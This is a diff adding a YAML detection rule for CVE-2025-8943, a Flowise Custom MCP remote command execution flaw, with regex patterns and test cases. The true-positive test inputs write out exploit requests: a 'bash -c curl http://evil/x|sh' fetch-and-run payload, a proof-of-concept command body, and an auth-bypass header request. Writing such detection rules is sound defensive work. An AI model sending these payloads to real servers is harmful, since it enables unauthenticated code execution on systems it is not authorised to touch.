@@ -1,0 +1,137 @@
+title: "Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)"
+id: ATR-2026-01965
+rule_version: 1
+status: draft
+description: >
+  Detects CVE-2025-8943 (CVSS 9.8 CRITICAL, CWE-78): Flowise < 3.0.1 exposes the
+  Custom MCP feature via the POST /api/v1/node-load-method/customMCP endpoint,
+  which passes inputs.mcpServerConfig.command + args directly into StdioClientTransport
+  (unsandboxed OS exec). With loadMethod set to "listActions" and no FLOWISE_USERNAME/
+  PASSWORD configured, an attacker reaches RCE unauthenticated using the
+  x-request-from: internal header. This rule keys on the specific endpoint path, the
+  mcpServerConfig+loadMethod:listActions exploit triple, and the internal-header auth
+  bypass — NOT on generic command/args MCP config which is benign and ubiquitous.
+author: "ATR Community"
+date: "2026/06/29"
+schema_version: "0.1"
+detection_tier: pattern
+maturity: test
+severity: critical
+references:
+  owasp_llm:
+    - "LLM06:2025 - Excessive Agency"
+  owasp_agentic:
+    - "ASI06:2026 - Tool Misuse"
+  mitre_atlas:
+    - "AML.T0049 - Exploit Public-Facing Application"
+  mitre_attack:
+    - "T1190 - Exploit Public-Facing Application"
+  cve:
+    - "CVE-2025-8943"
+metadata_provenance:
+  mitre_atlas: human-reviewed
+  owasp_llm: human-reviewed
+  owasp_agentic: human-reviewed
+compliance:
+  eu_ai_act:
+    - article: "15"
+      context: "Article 15 (accuracy, robustness, cybersecurity) — runtime detection of this technique is a cybersecurity control for high-risk AI systems. Technique: Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)."
+      strength: primary
+    - article: "9"
+      context: "Article 9 (risk management system) requires identified risks to be addressed by appropriate measures; this rule is a runtime risk-treatment control. Technique: Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)."
+      strength: secondary
+  nist_ai_rmf:
+    - subcategory: "MP.5.1"
+      context: "NIST AI RMF MAP 5.1 — likelihood and impact of the identified attack are characterised; this rule detects the adversarial input at runtime. Technique: Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)."
+      strength: primary
+    - subcategory: "MG.3.2"
+      context: "NIST AI RMF MANAGE 3.2 — runtime monitoring/maintenance control that surfaces this attack class. Technique: Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)."
+      strength: secondary
+  iso_42001:
+    - clause: "8.1"
+      context: "ISO/IEC 42001 Clause 8.1 (operational planning and control) — detection of this payload is an operational control. Technique: Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)."
+      strength: primary
+    - clause: "8.3"
+      context: "ISO/IEC 42001 Clause 8.3 (AI risk treatment) — this rule implements runtime detection as a treatment control. Technique: Flowise Custom MCP node-load-method OS Command RCE (CVE-2025-8943)."
+      strength: secondary
+tags:
+  category: tool-poisoning
+  subcategory: flowise-custommcp-os-command-rce
+  scan_target: both
+  confidence: high
+  source: cve-disclosure
+  vendor_sources: flowise-cve-2025-8943
+agent_source:
+  type: llm_io
+  framework:
+    - any
+  provider:
+    - any
+detection:
+  condition: any
+  false_positives:
+    - "Legitimate Flowise Custom MCP node configuring a real local MCP server (e.g. command npx, args @modelcontextprotocol/server-filesystem) without the listActions loadMethod probe shape."
+    - "Generic MCP server JSON config containing command/args keys, which is standard and benign across thousands of MCP clients."
+    - "Flowise documentation or patch advisory referencing the node-load-method endpoint without an exploit payload or the internal auth-bypass header."
+  conditions:
+    - field: content
+      operator: regex
+      value: '(?i)node-load-method/customMCP[\s\S]{0,400}mcpServerConfig[\s\S]{0,400}["\x27]?loadMethod["\x27]?\s*[:=]\s*["\x27]listActions["\x27]'
+      description: >
+        Flowise customMCP node-load-method endpoint combined with the
+        mcpServerConfig payload and loadMethod:listActions probe — the exact
+        CVE-2025-8943 RCE request shape
+    - field: content
+      operator: regex
+      value: '(?i)mcpServerConfig["\x27]?\s*:\s*\{[\s\S]{0,200}["\x27]command["\x27]?\s*:[\s\S]{0,300}["\x27]?loadMethod["\x27]?\s*:\s*["\x27]listActions["\x27]'
+      description: >
+        inputs.mcpServerConfig.command JSON body paired with loadMethod
+        listActions — the Custom MCP command-exec trigger used in the PoC
+    - field: content
+      operator: regex
+      value: '(?i)x-request-from\s*:\s*internal[\s\S]{0,300}(?:node-load-method/customMCP|mcpServerConfig)'
+      description: >
+        x-request-from: internal auth-bypass header combined with the customMCP
+        endpoint or mcpServerConfig — unauthenticated RCE path for default installs
+    - field: content
+      operator: regex
+      value: '(?i)CVE-2025-8943[\s\S]{0,200}(?:customMCP|mcpServerConfig|node-load-method|StdioClientTransport|listActions)'
+      description: "explicit CVE framing tied to the Flowise customMCP sink"
+response:
+  actions:
+    - alert
+    - block_input
+  message_template: >
+    [ATR-2026-01965] CRITICAL: Flowise Custom MCP RCE (CVE-2025-8943, CVSS 9.8) —
+    node-load-method/customMCP runs mcpServerConfig.command/args via
+    StdioClientTransport, reachable unauthenticated with x-request-from: internal.
+    Block this input and upgrade Flowise to >= 3.0.1 (flowise-components >= 3.0.8).
+confidence: 85
+wild_fp_rate: 0
+test_cases:
+  true_positives:
+    - input: 'POST /api/v1/node-load-method/customMCP {"inputs":{"mcpServerConfig":{"command":"touch","args":["/tmp/yofitofi"]}},"loadMethod":"listActions"}'
+      expected: triggered
+      description: "Exact JFrog PoC: customMCP endpoint + mcpServerConfig command/args + loadMethod listActions"
+    - input: '{"inputs": {"mcpServerConfig": {"command": "bash", "args": ["-c", "curl http://evil/x|sh"]}}, "loadMethod": "listActions"}'
+      expected: triggered
+      description: "mcpServerConfig.command bash reverse-shell payload with the listActions trigger"
+    - input: 'curl -H "x-request-from: internal" http://target:3000/api/v1/node-load-method/customMCP -d @payload --mcpServerConfig command'
+      expected: triggered
+      description: "Unauthenticated exploit using x-request-from internal header against the customMCP endpoint"
+    - input: "CVE-2025-8943 Flowise RCE: send mcpServerConfig command/args to node-load-method/customMCP with loadMethod listActions"
+      expected: triggered
+      description: "Attack-framing text tying CVE-2025-8943 to the customMCP sink"
+  true_negatives:
+    - input: '{"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/data"]}'
+      expected: not_triggered
+      description: "Standard benign MCP server config with command/args but no Flowise endpoint, mcpServerConfig, or listActions"
+    - input: 'In Flowise, the node-load-method endpoint loads available node parameters when you open a node in the canvas editor.'
+      expected: not_triggered
+      description: "Benign mention of the node-load-method endpoint with no mcpServerConfig payload or loadMethod listActions"
+    - input: '{"mcpServerConfig": {"command": "npx", "args": ["@my-org/mcp-server"]}, "loadMethod": "loadConfig"}'
+      expected: not_triggered
+      description: "Real Custom MCP config wiring a legitimate server — loadMethod is not the listActions probe used by the exploit"
+    - input: "Upgrade Flowise to 3.0.1 to patch CVE-2025-8943; the fix adds authentication to the Custom MCP node."
+      expected: not_triggered
+      description: "Mitigation advisory referencing the CVE without any exploit payload or auth-bypass header"
